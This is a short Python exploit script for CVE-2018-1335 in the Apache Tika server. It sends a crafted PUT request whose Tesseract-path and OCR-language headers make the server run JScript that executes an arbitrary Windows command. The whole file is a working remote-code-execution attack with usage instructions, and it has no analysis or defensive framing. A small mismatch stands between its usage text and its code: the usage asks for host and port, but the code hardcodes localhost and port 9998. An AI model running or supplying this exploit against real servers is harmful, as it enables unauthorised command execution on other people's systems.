import sys
import requests

if len(sys.argv) < 2:
	print("Usage: python CVE-2018-1335.py <host> <port> <command>")
	print("Example: python CVE-2018-1335.py localhost 9998 calc.exe")
else:
	host = "localhost"
	port = 9998
	cmd = sys.argv[1]

	url = host+":"+str(port)+"/meta"

	headers = {"X-Tika-OCRTesseractPath": "\"cscript\"", 
		"X-Tika-OCRLanguage": "//E:Jscript", 
		"Expect": "100-continue", 
		"Content-type": "image/jp2", 
		"Connection": "close"}

	jscript='''var oShell = WScript.CreateObject("WScript.Shell");
	var oExec = oShell.Exec('cmd /c {}');
	'''.format(cmd)

	try:
		requests.put("https://"+url, headers=headers, data=jscript, verify=False)
	
	except:
		try:
			requests.put("http://"+url, headers=headers, data=jscript)
		except:
			print("Something went wrong.\nUsage: python CVE-2018-1335.py <host> <port> <command>")
				